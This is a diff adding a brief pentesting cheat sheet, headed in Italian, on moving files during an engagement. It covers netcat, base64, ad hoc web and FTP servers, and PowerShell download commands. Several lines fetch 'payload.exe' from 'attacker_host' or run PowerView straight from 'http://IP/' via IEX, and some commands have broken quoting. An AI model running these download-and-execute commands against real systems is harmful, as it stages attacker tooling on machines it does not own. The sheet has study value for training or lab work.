@@ -1,0 +1,51 @@
+--=[ trasferimenti file ]=--
+
+netcat
+nc -lvvp 8888 > file.ext
+cat file.ext | nc IP 8888
+
+base64
+base64 file
+base64 -w 0
+base64 -d file
+
+python script
+send.py
+rec.py
+
+python simplehttpserver
+python -m SimpleHTTPServer 80
+
+python ftpserver
+python -m pyftpdlib -p21 -w
+
+php webserver
+php -S 0.0.0.0:80
+
+ruby
+ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
+
+upload file php
+upload.php 
+
+hfs
+hfs.exe 
+
+powershell
+PS C:\> $webclient = New-Object System.Net.WebClient
+PS C:\> $payload_url = "https://attacker_host/payload.exe"
+PS C:\> $file = “C:\ProgramData\payload.exe"
+PS C:\> $webclient.DownloadFile($payload_url,$file)
+
+IEX($browser.DownloadString("http://IP/PowerView.ps1"))
+
+powershell -nop -c "$r=New-Object System.Net.WebClient;$r.DownloadFile('http://IP/knx.exe', 'c:\users\knx.exe)"
+
+powershell IEX (Invoke-WebRequest -Uri "http://IP/knx.exe" -outfile "c:\users\knx.exe")
+
+webserver.ps1:  https://gallery.technet.microsoft.com/scriptcenter/Powershell-Webserver-74dcf466
+
+simplehttpserver: https://gist.github.com/zhilich/b8480f1d22f9b15d4fdde07ddc6fa4ed
+
+ESERCIZIO PER CASA:
+socat trasfer file
